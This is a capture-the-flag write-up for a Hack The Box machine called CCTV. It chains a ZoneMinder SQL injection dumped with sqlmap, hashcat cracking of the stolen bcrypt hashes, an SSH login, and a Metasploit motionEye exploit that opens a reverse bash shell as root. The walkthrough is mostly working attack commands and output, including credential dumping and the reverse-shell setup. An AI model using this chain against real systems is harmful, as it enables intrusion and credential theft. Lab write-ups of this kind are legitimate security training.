---
name: CCTV
difficulty: easy
os: linux
platform: htb
date: 2026/03/13
releasedDate: 2009-12-31
userFlag: true
rootFlag: true

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9867e8b14b7602881160973ebb50b2c4.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.244.156 -o allPorts
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We will add `cctv.htb` to our `/etc/hosts` file for easier access:

```bash
echo "10.129.244.156 cctv.htb" | sudo tee -a /etc/hosts
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p 22,80 -sCV 10.129.244.156 -o targeted
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
```

## User Exploitation

The web aplicacion is running `ZoneMinder`, a popular open-source CCTV software. We log in with the default credentials `admin:admin` and we are able to access the dashboard. 

If we look up for vulnerabilities, we find this [exploit](https://vulners.com/githubexploit/4FAC6E64-F88D-589F-B5EC-220EFF74F27B). We find out, this is a vulnerable version of `ZoneMinder`, vulnerable to a time-based blind SQL injection (`CVE-2024-51482`) in the `tid` parameter of the `removetag` action. 

We use `sqlmap` to exploit this vulnerability and extract the database information:

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
  --cookie="ZMSESSID=<session_cookie>" --dbs
```
```
information_schema
performance_schema
zm
```

We can also extract the users from the `zm` database. We check [ZoneMinder's database schema](https://github.com/ZoneMinder/zoneminder/blob/7ec5edc2e2be1fddf8bdfeabf8515c17d86ad859/db/zm_create.sql.in#L850) and find out that the users are stored in the `Users` table. We can extract the users with the following command:

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
  --cookie="ZMSESSID=<session_cookie>" \
  -D zm -T Users -C Username,Pass --dump --time-sec=1 --batch
```

```
superadmin:$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
admin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
```

We can crack the password hashes using `hashcat` with the `bcrypt` mode (3200):

```bash
hashcat -m 3200 -a 0 /usr/share/wordlists/rockyou.txt hashes.txt --username
```

```
mark:opensesame
admin:admin
```

After a long time, `hashcat` is able to crack `mark`'s password which allows loggin as this user via `SSH`:

```bash
ssh mark@cctv.htb
opensesame
whoami
```

```bash
mark
```

## Root Exploitation

We look for `password` strings in the machine and we find a file with the following content:

```bash
cd /
grep -r "password" 2>/dev/null
```

```text
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

We save the password, we will use it later.

We check listening ports in the machine:

```bash
ss -tulnp
```

```
PORT    SERVICE
1935    RTMP (video stream)
7999    motion control
8554    RTSP (camera feed)
8765    motionEye
8888    unknown
9081    camera stream
```

We forward the `motionEye` port to our local machine using `ssh`:

```bash
ssh -L 8765:localhost:8765 mark@cctv.htb
opensesame
```

We access `http://localhost:8765` and we find a `motionEye` instance running. We are able to log in with the credentials we found in the previous step:

```
Username: admin
Password: 989c5a8ee87a0e9521ec81a79187d162109282f0
```

We find a `Metasploit` exploit for `motionEye` which targets `CVE-2025_60787` and allows to add a malicious camera that executes a reverse shell when accessed. 

```
msfconsole -q
msf > search motioneye
msf > use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
```

We set the required options and we run the exploit:

```
set payload cmd/unix/reverse_bash
set RHOSTS 127.0.0.1
set RPORT 8765
set LHOST <your_ip>
set USERNAME admin
set PASSWORD 989c5a8ee87a0e9521ec81a79187d162109282f0
exploit
```

```
[*] Started reverse TCP handler on <your_ip>:4444
[+] The target appears to be vulnerable. Detected version 0.43.1b4, which is vulnerable
[*] Adding malicious camera...
[+] Camera successfully added
[*] Setting up exploit...
[+] Exploit setup complete
[*] Triggering exploit...
[+] Exploit triggered, waiting for session...
[*] Command shell session 1 opened (<your_ip>:4444 -> 10.129.244.156:41596)
[*] Removing camera
[+] Camera removed successfully
```

We get a reverse shell as `root`:

```bash
whoami
```

```bash
root
```

Finally, we can read the `user.txt` and `root.txt` flags:

```bash
cat /home/mark/user.txt
cat /root/root.txt
```

```
user flag value
root flag value
```

## Conclusion

In this writeup, we exploited a vulnerable `ZoneMinder` instance to extract user credentials and log in via `SSH`. Then, we found a `motionEye` instance running on the machine and we exploited a remote code execution vulnerability to get a reverse shell as `root`.